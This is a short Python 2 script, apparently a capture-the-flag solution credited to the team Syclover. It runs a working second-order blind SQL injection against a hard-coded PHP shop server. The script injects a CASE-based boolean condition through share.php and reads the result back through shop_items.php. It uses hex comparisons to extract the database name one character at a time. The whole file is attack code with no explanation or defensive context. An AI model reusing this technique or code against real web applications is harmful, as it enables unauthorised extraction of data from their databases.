# encoding: utf-8 
""" [+] @Syclover [+] 2017-5-30 0:20 """ 
import requests
"""    payload        """  
  # 
logical_statement = "text=9423>(case(%s)when(1)then(1)else(0)end)" 
query_statement = '(select(database())>0x{0})' 
query_statement_1 = '(select(database())<0x{0})' 
"""    payload        """
url_1 = "http://54.223.247.98:8090/share.php" 
url_2 = "http://54.223.247.98:8090/shop_items.php?id=%s" 
headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF -8",         
                       "Referer": "http://54.223.247.98:8090"
                       } 
hex_s = ["20", "21", "22", "23", "24", "25", "26", "27", "28", "29", "2A", "2B", "2C", "2D", "2E", "2F", "30", "31",         "32", "33", "34", "35", "36", "37", "38", "39", "3A", "3B", "3C", "3D", "3E", "3F", "40", "41", "42", "43",         "44", "45", "46", "47", "48", "49", "4A", "4B", "4C", "4D", "4E", "4F", "50", "51", "52", "53", "54", "55",         "56", "57", "58", "59", "5A", "5B", "5C", "5D", "5E", "5F", "60", "61", "62", "63", "64", "65", "66", "67",         "68", "69", "6A", "6B", "6C", "6D", "6E", "6F", "70", "71", "72", "73", "74", "75", "76", "77", "78", "79",         "7A", "7B", "7C", "7D", "7E", "7F", "80"]
data = ''
def _request(c, m):    
	if m is not 'last_char':      
		payload = logical_statement % query_statement  
	else:        
		payload = logical_statement % query_statement_1    
	for count in range(3):        
		try:
			response = requests.post(url_1, headers=headers, data=payload. format(data + c),)            
			response = requests.get(url_2 % response.content, headers=headers)           
			return response.content        
		except Exception as e:           
			print "Error Occurred : ", e.message
completed_flag = False 
for p in range(1, 100): 
	if completed_flag:        
		break    
	print 'Position: ', p    
	for w in hex_s:        
		if w == "80" and " " in _request(data[-2:], 'last_char'):           
			data = data[:-2] + hex_s[hex_s.index(data[-2:]) + 1]            
			completed_flag = True           
			break        
		elif " " in _request(w, '1'):            
			char_index = hex_s.index(w)            
			data += hex_s[(char_index - 1)  if char_index > 0 else char_index]            
			print data         
			break
print "data : ", data.decode('hex')
